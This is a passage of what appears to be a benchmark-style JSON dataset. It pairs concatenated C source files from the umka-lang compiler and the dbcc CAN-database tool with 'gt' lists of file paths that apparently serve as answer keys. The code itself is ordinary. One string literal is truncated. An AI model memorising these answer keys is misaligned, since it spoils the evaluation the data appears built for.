&comp->storage, &comp->debug, filePath, sourceString, &comp->error);\n\n\n\n    comp->argc  = argc;\n\n    comp->argv  = argv;\n\n\n\n    comp->blocks.module = moduleAdd(&comp->modules, \"__universe\");\n\n\n\n    compilerDeclareBuiltinTypes (comp);\n\n    compilerDeclareBuiltinIdents(comp);\n\n    compilerDeclareExternalFuncs(comp, fileSystemEnabled);\n\n\n\n\n\n    Type *argvType     = typeAdd(&comp->types, &comp->blocks, TYPE_ARRAY);\n\n    argvType->base     = comp->strType;\n\n    argvType->numItems = comp->argc;\n\n\n\n    Ident *rtlargv = identAllocVar(&comp->idents, &comp->types, &comp->modules, &comp->blocks, \"rtlargv\", argvType, true);\n\n    char **argArray = (char **)rtlargv->ptr;\n\n\n\n    for (int i = 0; i < comp->argc; i++)\n\n    {\n\n        argArray[i] = storageAddStr(&comp->storage, strlen(comp->argv[i]));\n\n        strcpy(argArray[i], comp->argv[i]);\n\n    }\n\n\n\n\n\n    const int numRuntimeModules = sizeof(runtimeModuleSources) / sizeof(runtimeModuleSources[0]);\n\n    for (int i = 0; i < numRuntimeModules; i++)\n\n    {\n\n        char runtimeModulePath[DEFAULT_STR_LEN + 1] = \"\";\n\n        moduleAssertRegularizePath(&comp->modules, runtimeModuleNames[i], comp->modules.curFolder, runtimeModulePath, DEFAULT_STR_LEN + 1);\n\n        moduleAddSource(&comp->modules, runtimeModulePath, runtimeModuleSources[i]);\n\n    }\n\n}\n\n\n\n\n\nvoid compilerFree(Compiler *comp)\n\n{\n\n    lexFree         (&comp->lex);\n\n    vmFree          (&comp->vm);\n\n    genFree         (&comp->gen);\n\n    constFree       (&comp->consts);\n\n    identFree       (&comp->idents, -1);\n\n    typeFree        (&comp->types, -1);\n\n    externalFree    (&comp->externals);\n\n    blocksFree      (&comp->blocks);\n\n    moduleFree      (&comp->modules);\n\n    storageFree     (&comp->storage);\n\n    errorReportFree (&comp->error.report);\n\n\n\n#ifdef _WIN32\n\n    SetConsoleOutputCP(comp->originalCodepage);\n\n#endif\n\n}\n\n\n\n\n\nvoid compilerCompile(Compiler *comp)\n\n{\n\n    parseProgram(comp);\n\n    vmReset(&comp->vm, comp->gen.code, comp->gen.debugPerInstr);\n\n}\n\n\n\n\n\nvoid compilerRun(Compiler *comp)\n\n{\n\n    vmRun(&comp->vm, NULL);\n\n}\n\n\n\n\n\nvoid compilerCall(Compiler *comp, FuncContext *fn)\n\n{\n\n    vmRun(&comp->vm, fn);\n\n}\n\n\n\n\n\nchar *compilerAsm(Compiler *comp)\n\n{\n\n    const int chars = genAsm(&comp->gen, NULL, 0);\n\n    if (chars < 0)\n\n        return NULL;\n\n\n\n    char *buf = malloc(chars + 1);\n\n    genAsm(&comp->gen, buf, chars);\n\n    buf[chars] = 0;\n\n    return buf;\n\n}\n\n\n\n\n\nbool compilerAddModule(Compiler *comp, const char *fileName, const char *sourceString)\n\n{\n\n    char modulePath[DEFAULT_STR_LEN + 1] = \"\";\n\n    moduleAssertRegularizePath(&comp->modules, fileName, comp->modules.curFolder, modulePath, DEFAULT_STR_LEN + 1);\n\n\n\n    if (moduleFindSource(&comp->modules, modulePath))\n\n        return false;\n\n\n\n    moduleAddSource(&comp->modules, modulePath, sourceString);\n\n    return true;\n\n}\n\n\n\n\n\nbool compilerAddFunc(Compiler *comp, const char *name, ExternFunc func)\n\n{\n\n    if (externalFind(&comp->externals, name))\n\n        return false;\n\n\n\n    externalAdd(&comp->externals, name, func);\n\n    return true;\n\n}\n\n\n\n\n\nbool compilerGetFunc(Compiler *comp, const char *moduleName, const char *funcName, FuncContext *fn)\n\n{\n\n    int module = 1;\n\n    if (moduleName)\n\n    {\n\n        char modulePath[DEFAULT_STR_LEN + 1] = \"\";\n\n        moduleAssertRegularizePath(&comp->modules, moduleName, comp->modules.curFolder, modulePath, DEFAULT_STR_LEN + 1);\n\n        module = moduleFind(&comp->modules, modulePath);\n\n    }\n\n\n\n    Ident *fnIdent = identFind(&comp->idents, &comp->modules, &comp->blocks, module, funcName, NULL, false);\n\n    if (!fnIdent || fnIdent->kind != IDENT_CONST || fnIdent->type->kind != TYPE_FN)\n\n        return false;\n\n\n\n    fnIdent->used = true;\n\n\n\n    compilerMakeFuncContext(comp, fnIdent->type, fnIdent->offset, fn);\n\n    return true;\n\n}\n\n\n\n\n\nvoid compilerMakeFuncContext(Compiler *comp, Type *fnType, int entryOffset, FuncContext *fn)\n\n{\n\n    fn->entryOffset = entryOffset;\n\n\n\n    int paramSlots = typeParamSizeTotal(&comp->types, &fnType->sig) / sizeof(Slot);\n\n    fn->params = (Slot *)storageAdd(&comp->storage, (paramSlots + 4) * sizeof(Slot)) + 4;\n\n\n\n    ExternalCallParamLayout *paramLayout = typeMakeParamLayout(&comp->types, &comp->storage, &fnType->sig);\n\n    fn->params[-4].ptrVal = paramLayout;\n\n\n\n    fn->result = (Slot *)storageAdd(&comp->storage, sizeof(Slot));\n\n}\n\n\n'umka-lang/src/umka_compiler.h'\n:#ifndef UMKA_COMPILER_H_INCLUDED\n\n#define UMKA_COMPILER_H_INCLUDED\n\n\n\n#include \"umka_common.h\"\n\n#include \"umka_lexer.h\"\n\n#include \"umka_types.h\"\n\n#include \"umka_vm.h\"\n\n#include \"umka_gen.h\"\n\n#include \"umka_ident.h\"\n\n#include \"umka_const.h\"\n\n#include \"umka_runtime.h\"\n\n#include \"umka_api.h\"\n\n\n\n\n\ntypedef struct\n\n{\n\n    UmkaAPI     api;\n\n\n\n    Storage     storage;\n\n    Modules     modules;\n\n    Blocks      blocks;\n\n    Externals   externals;\n\n    Lexer       lex;\n\n    Types       types;\n\n    Idents      idents;\n\n    Consts      consts;\n\n    CodeGen     gen;\n\n    VM          vm;\n\n    DebugInfo   debug;\n\n    Error       error;\n\n\n\n\n\n    Type *voidType,\n\n         *nullType,\n\n         *int8Type,  *int16Type,  *int32Type,  *intType,\n\n         *uint8Type, *uint16Type, *uint32Type, *uintType,\n\n         *boolType,\n\n         *charType,\n\n         *real32Type, *realType,\n\n         *strType,\n\n         *fiberType,\n\n         *ptrVoidType, *ptrNullType,\n\n         *anyType;\n\n\n\n\n\n    int argc;\n\n    char **argv;\n\n\n\n\n\n    unsigned int originalCodepage;\n\n\n\n} Compiler;\n\n\n\n\n\nvoid compilerInit               (Compiler *comp, const char *fileName, const char *sourceString, int stackSize, int argc, char **argv, bool fileSystemEnabled, bool implLibsEnabled);\n\nvoid compilerFree               (Compiler *comp);\n\nvoid compilerCompile            (Compiler *comp);\n\nvoid compilerRun                (Compiler *comp);\n\nvoid compilerCall               (Compiler *comp, FuncContext *fn);\n\nchar *compilerAsm               (Compiler *comp);\n\nbool compilerAddModule          (Compiler *comp, const char *fileName, const char *sourceString);\n\nbool compilerAddFunc            (Compiler *comp, const char *name, ExternFunc func);\n\nbool compilerGetFunc            (Compiler *comp, const char *moduleName, const char *funcName, FuncContext *fn);\n\nvoid compilerMakeFuncContext    (Compiler *comp, Type *fnType, int entryOffset, FuncContext *fn);\n\n\n\n#endif\n\n",
        "gt": [
            "'umka-lang/src/umka_gen.h'",
            "'umka-lang/src/umka_compiler.h'",
            "'umka-lang/src/umka_compiler.c'"
        ]
    },
    {
        "files": [
            "'dbcc/2json.h'",
            "'dbcc/mpc.h'",
            "'dbcc/2json.c'",
            "'dbcc/can.h'"
        ],
        "content": "'dbcc/2json.h'\n:#ifndef _2JSON_H\n#define _2JSON_H\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"can.h\"\n\nint dbc2json(dbc_t *dbc, FILE *output, bool use_time_stamps);\n\n#ifdef __cplusplus\n}\n#endif\n#endif\n\n'dbcc/mpc.h'\n:\n\n#ifndef mpc_h\n#define mpc_h\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdarg.h>\n#include <string.h>\n#include <math.h>\n#include <errno.h>\n#include <ctype.h>\n\n\n\ntypedef struct {\n  long pos;\n  long row;\n  long col;\n  int term;\n} mpc_state_t;\n\n\n\ntypedef struct {\n  mpc_state_t state;\n  int expected_num;\n  char *filename;\n  char *failure;\n  char **expected;\n  char received;\n} mpc_err_t;\n\nvoid mpc_err_delete(mpc_err_t *e);\nchar *mpc_err_string(mpc_err_t *e);\nvoid mpc_err_print(mpc_err_t *e);\nvoid mpc_err_print_to(mpc_err_t *e, FILE *f);\n\n\n\ntypedef void mpc_val_t;\n\ntypedef union {\n  mpc_err_t *error;\n  mpc_val_t *output;\n} mpc_result_t;\n\nstruct mpc_parser_t;\ntypedef struct mpc_parser_t mpc_parser_t;\n\nint mpc_parse(const char *filename, const char *string, mpc_parser_t *p, mpc_result_t *r);\nint mpc_nparse(const char *filename, const char *string, size_t length, mpc_parser_t *p, mpc_result_t *r);\nint mpc_parse_file(const char *filename, FILE *file, mpc_parser_t *p, mpc_result_t *r);\nint mpc_parse_pipe(const char *filename, FILE *pipe, mpc_parser_t *p, mpc_result_t *r);\nint mpc_parse_contents(const char *filename, mpc_parser_t *p, mpc_result_t *r);\n\n\n\ntypedef void(*mpc_dtor_t)(mpc_val_t*);\ntypedef mpc_val_t*(*mpc_ctor_t)(void);\n\ntypedef mpc_val_t*(*mpc_apply_t)(mpc_val_t*);\ntypedef mpc_val_t*(*mpc_apply_to_t)(mpc_val_t*,void*);\ntypedef mpc_val_t*(*mpc_fold_t)(int,mpc_val_t**);\n\ntypedef int(*mpc_check_t)(mpc_val_t**);\ntypedef int(*mpc_check_with_t)(mpc_val_t**,void*);\n\n\n\nmpc_parser_t *mpc_new(const char *name);\nmpc_parser_t *mpc_copy(mpc_parser_t *a);\nmpc_parser_t *mpc_define(mpc_parser_t *p, mpc_parser_t *a);\nmpc_parser_t *mpc_undefine(mpc_parser_t *p);\n\nvoid mpc_delete(mpc_parser_t *p);\nvoid mpc_cleanup(int n, ...);\n\n\n\nmpc_parser_t *mpc_any(void);\nmpc_parser_t *mpc_char(char c);\nmpc_parser_t *mpc_range(char s, char e);\nmpc_parser_t *mpc_oneof(const char *s);\nmpc_parser_t *mpc_noneof(const char *s);\nmpc_parser_t *mpc_satisfy(int(*f)(char));\nmpc_parser_t *mpc_string(const char *s);\n\n\n\nmpc_parser_t *mpc_pass(void);\nmpc_parser_t *mpc_fail(const char *m);\nmpc_parser_t *mpc_failf(const char *fmt, ...);\nmpc_parser_t *mpc_lift(mpc_ctor_t f);\nmpc_parser_t *mpc_lift_val(mpc_val_t *x);\nmpc_parser_t *mpc_anchor(int(*f)(char,char));\nmpc_parser_t *mpc_state(void);\n\n\n\nmpc_parser_t *mpc_expect(mpc_parser_t *a, const char *e);\nmpc_parser_t *mpc_expectf(mpc_parser_t *a, const char *fmt, ...);\nmpc_parser_t *mpc_apply(mpc_parser_t *a, mpc_apply_t f);\nmpc_parser_t *mpc_apply_to(mpc_parser_t *a, mpc_apply_to_t f, void *x);\nmpc_parser_t *mpc_check(mpc_parser_t *a, mpc_dtor_t da, mpc_check_t f, const char *e);\nmpc_parser_t *mpc_check_with(mpc_parser_t *a, mpc_dtor_t da, mpc_check_with_t f, void *x, const char *e);\nmpc_parser_t *mpc_checkf(mpc_parser_t *a, mpc_dtor_t da, mpc_check_t f, const char *fmt, ...);\nmpc_parser_t *mpc_check_withf(mpc_parser_t *a, mpc_dtor_t da, mpc_check_with_t f, void *x, const char *fmt, ...);\n\nmpc_parser_t *mpc_not(mpc_parser_t *a, mpc_dtor_t da);\nmpc_parser_t *mpc_not_lift(mpc_parser_t *a, mpc_dtor_t da, mpc_ctor_t lf);\nmpc_parser_t *mpc_maybe(mpc_parser_t *a);\nmpc_parser_t *mpc_maybe_lift(mpc_parser_t *a, mpc_ctor_t lf);\n\nmpc_parser_t *mpc_many(mpc_fold_t f, mpc_parser_t *a);\nmpc_parser_t *mpc_many1(mpc_fold_t f, mpc_parser_t *a);\nmpc_parser_t *mpc_count(int n, mpc_fold_t f, mpc_parser_t *a, mpc_dtor_t da);\n\nmpc_parser_t *mpc_or(int n, ...);\nmpc_parser_t *mpc_and(int n, mpc_fold_t f, ...);\n\nmpc_parser_t *mpc_predictive(mpc_parser_t *a);\n\n\n\nmpc_parser_t *mpc_eoi(void);\nmpc_parser_t *mpc_soi(void);\n\nmpc_parser_t *mpc_boundary(void);\nmpc_parser_t *mpc_boundary_newline(void);\n\nmpc_parser_t *mpc_whitespace(void);\nmpc_parser_t *mpc_whitespaces(void);\nmpc_parser_t *mpc_blank(void);\n\nmpc_parser_t *mpc_newline(void);\nmpc_parser_t *mpc_tab(void);\nmpc_parser_t *mpc_escape(void);\n\nmpc_parser_t *mpc_digit(void);\nmpc_parser_t *mpc_hexdigit(void);\nmpc_parser_t *mpc_octdigit(void);\nmpc_parser_t *mpc_digits(void);\nmpc_parser_t *mpc_hexdigits(void);\nmpc_parser_t *mpc_octdigits(void);\n\nmpc_parser_t *mpc_lower(void);\nmpc_parser_t *mpc_upper(void);\nmpc_parser_t *mpc_alpha(void);\nmpc_parser_t *mpc_underscore(void);\nmpc_parser_t *mpc_alphanum(void);\n\nmpc_parser_t *mpc_int(void);\nmpc_parser_t *mpc_hex(void);\nmpc_parser_t *mpc_oct(void);\nmpc_parser_t *mpc_number(void);\n\nmpc_parser_t *mpc_real(void);\nmpc_parser_t *mpc_float(void);\n\nmpc_parser_t *mpc_char_lit(void);\nmpc_parser_t *mpc_string_lit(void);\nmpc_parser_t *mpc_regex_lit(void);\n\nmpc_parser_t *mpc_ident(void);\n\n\n\nmpc_parser_t *mpc_startwith(mpc_parser_t *a);\nmpc_parser_t *mpc_endwith(mpc_parser_t *a, mpc_dtor_t da);\nmpc_parser_t *mpc_whole(mpc_parser_t *a, mpc_dtor_t da);\n\nmpc_parser_t *mpc_stripl(mpc_parser_t *a);\nmpc_parser_t *mpc_stripr(mpc_parser_t *a);\nmpc_parser_t *mpc_strip(mpc_parser_t *a);\nmpc_parser_t *mpc_tok(mpc_parser_t *a);\nmpc_parser_t *mpc_sym(const char *s);\nmpc_parser_t *mpc_total(mpc_parser_t *a, mpc_dtor_t da);\n\nmpc_parser_t *mpc_between(mpc_parser_t *a, mpc_dtor_t ad, const char *o, const char *c);\nmpc_parser_t *mpc_parens(mpc_parser_t *a, mpc_dtor_t ad);\nmpc_parser_t *mpc_braces(mpc_parser_t *a, mpc_dtor_t ad);\nmpc_parser_t *mpc_brackets(mpc_parser_t *a, mpc_dtor_t ad);\nmpc_parser_t *mpc_squares(mpc_parser_t *a, mpc_dtor_t ad);\n\nmpc_parser_t *mpc_tok_between(mpc_parser_t *a, mpc_dtor_t ad, const char *o, const char *c);\nmpc_parser_t *mpc_tok_parens(mpc_parser_t *a, mpc_dtor_t ad);\nmpc_parser_t *mpc_tok_braces(mpc_parser_t *a, mpc_dtor_t ad);\nmpc_parser_t *mpc_tok_brackets(mpc_parser_t *a, mpc_dtor_t ad);\nmpc_parser_t *mpc_tok_squares(mpc_parser_t *a, mpc_dtor_t ad);\n\nmpc_parser_t *mpc_sepby1(mpc_fold_t f, mpc_parser_t *sep, mpc_parser_t *a);\n\n\n\nvoid mpcf_dtor_null(mpc_val_t *x);\n\nmpc_val_t *mpcf_ctor_null(void);\nmpc_val_t *mpcf_ctor_str(void);\n\nmpc_val_t *mpcf_free(mpc_val_t *x);\nmpc_val_t *mpcf_int(mpc_val_t *x);\nmpc_val_t *mpcf_hex(mpc_val_t *x);\nmpc_val_t *mpcf_oct(mpc_val_t *x);\nmpc_val_t *mpcf_float(mpc_val_t *x);\nmpc_val_t *mpcf_strtriml(mpc_val_t *x);\nmpc_val_t *mpcf_strtrimr(mpc_val_t *x);\nmpc_val_t *mpcf_strtrim(mpc_val_t *x);\n\nmpc_val_t *mpcf_escape(mpc_val_t *x);\nmpc_val_t *mpcf_escape_regex(mpc_val_t *x);\nmpc_val_t *mpcf_escape_string_raw(mpc_val_t *x);\nmpc_val_t *mpcf_escape_char_raw(mpc_val_t *x);\n\nmpc_val_t *mpcf_unescape(mpc_val_t *x);\nmpc_val_t *mpcf_unescape_regex(mpc_val_t *x);\nmpc_val_t *mpcf_unescape_string_raw(mpc_val_t *x);\nmpc_val_t *mpcf_unescape_char_raw(mpc_val_t *x);\n\nmpc_val_t *mpcf_null(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_fst(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_snd(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_trd(int n, mpc_val_t** xs);\n\nmpc_val_t *mpcf_fst_free(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_snd_free(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_trd_free(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_all_free(int n, mpc_val_t** xs);\n\nmpc_val_t *mpcf_freefold(int n, mpc_val_t** xs);\nmpc_val_t *mpcf_strfold(int n, mpc_val_t** xs);\n\n\n\nenum {\n  MPC_RE_DEFAULT   = 0,\n  MPC_RE_M         = 1,\n  MPC_RE_S         = 2,\n  MPC_RE_MULTILINE = 1,\n  MPC_RE_DOTALL    = 2\n};\n\nmpc_parser_t *mpc_re(const char *re);\nmpc_parser_t *mpc_re_mode(const char *re, int mode);\n\n\n\ntypedef struct mpc_ast_t {\n  char *tag;\n  char *contents;\n  mpc_state_t state;\n  int children_num;\n  struct mpc_ast_t** children;\n} mpc_ast_t;\n\nmpc_ast_t *mpc_ast_new(const char *tag, const char *contents);\nmpc_ast_t *mpc_ast_build(int n, const char *tag, ...);\nmpc_ast_t *mpc_ast_add_root(mpc_ast_t *a);\nmpc_ast_t *mpc_ast_add_child(mpc_ast_t *r, mpc_ast_t *a);\nmpc_ast_t *mpc_ast_add_tag(mpc_ast_t *a, const char *t);\nmpc_ast_t *mpc_ast_add_root_tag(mpc_ast_t *a, const char *t);\nmpc_ast_t *mpc_ast_tag(mpc_ast_t *a, const char *t);\nmpc_ast_t *mpc_ast_state(mpc_ast_t *a, mpc_state_t s);\n\nvoid mpc_ast_delete(mpc_ast_t *a);\nvoid mpc_ast_print(mpc_ast_t *a);\nvoid mpc_ast_print_to(mpc_ast_t *a, FILE *fp);\n\nint mpc_ast_get_index(mpc_ast_t *ast, const char *tag);\nint mpc_ast_get_index_lb(mpc_ast_t *ast, const char *tag, int lb);\nmpc_ast_t *mpc_ast_get_child(mpc_ast_t *ast, const char *tag);\nmpc_ast_t *mpc_ast_get_child_lb(mpc_ast_t *ast, const char *tag, int lb);\n\ntypedef enum {\n  mpc_ast_trav_order_pre,\n  mpc_ast_trav_order_post\n} mpc_ast_trav_order_t;\n\ntypedef struct mpc_ast_trav_t {\n  mpc_ast_t             *curr_node;\n  struct mpc_ast_trav_t *parent;\n  int                    curr_child;\n  mpc_ast_trav_order_t   order;\n} mpc_ast_trav_t;\n\nmpc_ast_trav_t *mpc_ast_traverse_start(mpc_ast_t *ast,\n                                       mpc_ast_trav_order_t order);\n\nmpc_ast_t *mpc_ast_traverse_next(mpc_ast_trav_t **trav);\n\nvoid mpc_ast_traverse_free(mpc_ast_trav_t **trav);\n\n\nint mpc_ast_eq(mpc_ast_t *a, mpc_ast_t *b);\n\nmpc_val_t *mpcf_fold_ast(int n, mpc_val_t **as);\nmpc_val_t *mpcf_str_ast(mpc_val_t *c);\nmpc_val_t *mpcf_state_ast(int n, mpc_val_t **xs);\n\nmpc_parser_t *mpca_tag(mpc_parser_t *a, const char *t);\nmpc_parser_t *mpca_add_tag(mpc_parser_t *a, const char *t);\nmpc_parser_t *mpca_root(mpc_parser_t *a);\nmpc_parser_t *mpca_state(mpc_parser_t *a);\nmpc_parser_t *mpca_total(mpc_parser_t *a);\n\nmpc_parser_t *mpca_not(mpc_parser_t *a);\nmpc_parser_t *mpca_maybe(mpc_parser_t *a);\n\nmpc_parser_t *mpca_many(mpc_parser_t *a);\nmpc_parser_t *mpca_many1(mpc_parser_t *a);\nmpc_parser_t *mpca_count(int n, mpc_parser_t *a);\n\nmpc_parser_t *mpca_or(int n, ...);\nmpc_parser_t *mpca_and(int n, ...);\n\nenum {\n  MPCA_LANG_DEFAULT              = 0,\n  MPCA_LANG_PREDICTIVE           = 1,\n  MPCA_LANG_WHITESPACE_SENSITIVE = 2\n};\n\nmpc_parser_t *mpca_grammar(int flags, const char *grammar, ...);\n\nmpc_err_t *mpca_lang(int flags, const char *language, ...);\nmpc_err_t *mpca_lang_file(int flags, FILE *f, ...);\nmpc_err_t *mpca_lang_pipe(int flags, FILE *f, ...);\nmpc_err_t *mpca_lang_contents(int flags, const char *filename, ...);\n\n\n\n\nvoid mpc_print(mpc_parser_t *p);\nvoid mpc_optimise(mpc_parser_t *p);\nvoid mpc_stats(mpc_parser_t *p);\n\nint mpc_test_pass(mpc_parser_t *p, const char *s, const void *d,\n  int(*tester)(const void*, const void*),\n  mpc_dtor_t destructor,\n  void(*printer)(const void*));\n\nint mpc_test_fail(mpc_parser_t *p, const char *s, const void *d,\n  int(*tester)(const void*, const void*),\n  mpc_dtor_t destructor,\n  void(*printer)(const void*));\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'dbcc/2json.c'\n:\n#include \"2json.h\"\n#include \"util.h\"\n#include <assert.h>\n#include <time.h>\n\nstatic int print_escaped(FILE *o, const char *string)\n{\n\tassert(o);\n\tassert(string);\n\tchar c;\n\tint r = 0;\n\twhile ((c = *(string)++)) {\n\t\tswitch(c) {\n\t\tcase '\"':  r = fputs(\"&quot;\", o); break;\n\t\tcase '\\'': r = fputs(\"&apos;\", o); break;\n\t\tcase '<':  r = fputs(\"&lt;\",   o); break;\n\t\tcase '>':  r = fputs(\"&gt;\",   o); break;\n\t\tcase '&':  r = fputs(\"&amp;\",  o); break;\n\t\tdefault:\n\t\t\tr = fputc(c, o);\n\t\t}\n\t\tif (r < 0)\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n\nstatic int indent(FILE *o, unsigned depth)\n{\n\tassert(o);\n\twhile (depth--)\n\t\tif (fputc('\\t', o) != '\\t')\n\t\t\treturn -1;\n\treturn 0;\n}\n\nenum { INT, STRING, BOOL, FLOAT };\n\nstatic int pfield(FILE *o, unsigned depth, bool last, int type, const char *node, const char *fmt, ...)\n{\n\tassert(o);\n\tassert(node);\n\tassert(fmt);\n\tva_list args;\n\tassert(o && node && fmt);\n\terrno = 0;\n\tif (indent(o, depth) < 0)\n\t\tgoto warn;\n\tif (fprintf(o, \"\\\"%s\\\" : %s\", node, type == STRING ? \"\\\"\" : \"\") < 0)\n\t\tgoto warn;\n\tassert(fmt);\n\tva_start(args, fmt);\n\tint r = vfprintf(o, fmt, args);\n\tva_end(args);\n\tif (r < 0)\n\t\tgoto warn;\n\tif (fprintf(o, \"%s%s\\n\", type == STRING ? \"\\\"\" : \"\", !last ? \",\" : \"\") < 0)\n\t\tgoto warn;\n\treturn 0;\nwarn:\n\twarning(\"XML node generation, problem writing to FILE* <%p>: %s\", o, emsg());\n\treturn -1;\n}\n\nstatic int signal2json(signal_t *sig, FILE *o, unsigned depth, int multiplexed, int selector, int is_value)\n{\n\tassert(sig);\n\tassert(o);\n\tif (!is_value)\n\t\tindent(o, depth);\n\tfprintf(o, \"{\\n\");\n\tpfield(o, depth+1, false, STRING, \"name\",      \"%s\", sig->name);\n\tpfield(o, depth+1, false, INT,    \"startbit\",  \"%u\", sig->start_bit);\n\tpfield(o, depth+1, false, INT,    \"bitlength\", \"%u\", sig->bit_length);\n\tpfield(o, depth+1, false, STRING, \"endianess\", \"%s\", sig->endianess == endianess_motorola_e ? \"motorola\" : \"intel\");\n\tpfield(o, depth+1, false, FLOAT,  \"scaling\",   \"%g\", sig->scaling);\n\tpfield(o, depth+1, false, FLOAT,  \"offset\",    \"%g\", sig->offset);\n\tpfield(o, depth+1, false, FLOAT,  \"minimum\",   \"%g\", sig->minimum);\n\tpfield(o, depth+1, false, FLOAT,  \"maximum\",   \"%g\", sig->maximum);\n\tpfield(o, depth+1, false, BOOL,   \"signed\",    \"%s\", sig->is_signed ? \"true\" : \"false\");\n\tpfield(o, depth+1, false, INT,    \"floating\",  \"%u\", sig->is_floating ? sig->sigval : 0);\n\tif (multiplexed)\n\t\tpfield(o, depth+1, false, STRING, \"selector\",      \"%u\", selector);\n\n\tindent(o, depth+1);\n\tfprintf(o, \"\\\"units\\\" : \\\"\");\n\tprint_escaped(o, sig->units);\n\tfprintf(o, \"\\\"\\n\");\n\n\tindent(o, depth);\n\tif (fprintf(o, \"}\") < 0)\n\t\treturn -1;\n\treturn 0;\n}\n\nstatic int msg2json(can_msg_t *msg, FILE *o, unsigned depth)\n{\n\tassert(msg);\n\tassert(o);\n\tindent(o, depth);\n\tfprintf(o, \"{\\n\");\n\tpfield(o, depth+1, false, STRING, \"name\",      \"%s\", msg->name);\n\tpfield(o, depth+1, false, INT,    \"id\",        \"%u\", msg->id);\n\tpfield(o, depth+1, false, BOOL,   \"extended\",  \"%s\", msg->is_extended ? \"true\" : \"false\");\n\tpfield(o, depth+1, false, INT,    \"dlc\",       \"%u\", msg->dlc);\n\n\tsignal_t *multiplexor = NULL;\n\tindent(o, depth+1);\n\tfprintf(o, \"\\\"signals\\\": [\\n\");\n\tfor (size_t i = 0; i < msg->signal_count; i++) {\n\t\tsignal_t *sig = msg->sigs[i];\n\t\tif (sig->is_multiplexor) {\n\t\t\tif (multiplexor) {\n\t\t\t\terror(\"multiple multiplexor values detected (only one per CAN msg is allowed) for %s\", msg->name);\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\tmultiplexor = sig;\n\t\t\tcontinue;\n\t\t}\n\t\tif (sig->is_multiplexed)\n\t\t\tcontinue;\n\t\tif (signal2json(sig, o, depth+2, 0, 0, 0) < 0)\n\t\t\treturn -1;\n\t\tif ((msg->signal_count && i < (msg->signal_count - 1)))\n\t\t\tfprintf(o, \",\");\n\t\tfprintf(o, \"\\n\");\n\t}\n\tindent(o, depth+1);\n\tfprintf(o, \"]%s\\n\", multiplexor ? \",\" : \"\");\n\n\tif (multiplexor) {\n\t\tindent(o, depth+1);\n\t\tfprintf(o, \"\\\"multiplexor-group\\\" : {\\n\");\n\t\tindent(o, depth+2);\n\t\tfprintf(o, \"\\\"multiplexor\\\" : \");\n\t\tif (signal2json(multiplexor, o, depth+3, 0, 0, 1) < 0)\n\t\t\treturn -1;\n\t\tfprintf(o, \"%s\\n\", msg->signal_count ? \",\" : \"\");\n\t\tsize_t multiplexed_count = 0;\n\t\tfor (size_t i = 0; i < msg->signal_count; i++) {\n\t\t\tsignal_t *sig = msg->sigs[i];\n\t\t\tif (sig->is_multiplexed)\n\t\t\t\tmultiplexed_count++;\n\t\t}\n\n\t\tindent(o, depth+2);\n\t\tfprintf(o, \"\\\"multiplexed\\\" : [\\n\");\n\t\tfor (size_t i = 0, j = 0; i < msg->signal_count; i++) {\n\t\t\tsignal_t *sig = msg->sigs[i];\n\t\t\tif (!(sig->is_multiplexed))\n\t\t\t\tcontinue;\n\t\t\tj++;\n\t\t\tif (signal2json(sig, o, depth+3, 1, sig->switchval, 0) < 0)\n\t\t\t\treturn -1;\n\t\t\tif (multiplexed_count && j < multiplexed_count)\n\t\t\t\tfprintf(o, \",\");\n\t\t\tfprintf(o, \"\\n\");\n\n\t\t}\n\t\tindent(o, depth+2);\n\t\tfprintf(o, \"]\\n\");\n\n\t\tindent(o, depth+1);\n\t\tfprintf(o, \"}\\n\");\n\t}\n\n\tindent(o, depth);\n\tif (fprintf(o, \"}\") < 0)\n\t\treturn -1;\n\treturn 0;\n}\n\nint dbc2json(dbc_t *dbc, FILE *output, bool use_time_stamps)\n{\n\tassert(dbc);\n\tassert(output);\n\ttime_t rawtime = time(NULL);\n\tstruct tm *timeinfo = localtime(&rawtime);\n\n\tfprintf(output, \"{\\n\");\n\tfprintf(output, \"\\t\\\"description\\\" : \\\"JSON generated from a CAN DBC file\\\",\\n\");\n\tfprintf(output, \"\\t\\\"compiler\\\" : \\\"dbcc\\\",\\n\");\n\tfprintf(output, \"\\t\\\"site\\\" : \\\"https:\n\tif (use_time_stamps)\n\t\tfprintf(output, \"\\t\\\"generated-on\\\": %s,\", asctime(timeinfo));\n\n\tfprintf(output, \"\\t\\\"messages\\\" : [\\n\");\n\tfor (size_t i = 0; i < dbc->message_count; i++) {\n\t\tif (msg2json(dbc->messages[i], output, 2) < 0)\n\t\t\treturn -1;\n\t\tif (dbc->message_count && i < (dbc->message_count - 1))\n\t\t\tfprintf(output, \",\");\n\t\tfprintf(output, \"\\n\");\n\t}\n\tfprintf(output, \"\\t]\\n\");\n\tif (fprintf(output, \"}\\n\") < 0)\n\t\treturn -1;\n\treturn 0;\n}\n\n\n'dbcc/can.h'\n:#ifndef CAN_H\n#define CAN_H\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include <stdint.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include \"mpc.h\"\n\ntypedef enum {\n\tendianess_motorola_e = 0,\n\tendianess_intel_e = 1,\n} endianess_e;\n\ntypedef enum {\n\tnumeric_unsigned_e,\n\tnumeric_signed_e,\n\tnumeric_floating_e,\n} numeric_e;\n\ntypedef struct {\n\tchar *name;\n\tunsigned value;\n} val_list_item_t;\n\ntypedef struct {\n\tsize_t val_list_item_count;\n\tval_list_item_t **val_list_items;\n\tunsigned id;\n\tchar *name;\n} val_list_t;\n\ntypedef struct {\n\tchar *multiplexed;\n\tchar *multiplexor;\n\tunsigned min_value;\n\tunsigned max_value;\n\tunsigned id;\n} mul_val_list_t;\n\ntypedef struct signal_t signal_t;\n\nstruct signal_t {\n\tsize_t ecu_count;\n\tchar *units;\n\tchar **ecus;\n\tchar *name;\n\tdouble scaling;\n\tdouble offset;\n\tdouble minimum;\n\tdouble maximum;\n\tunsigned bit_length;\n\tunsigned start_bit;\n\tendianess_e 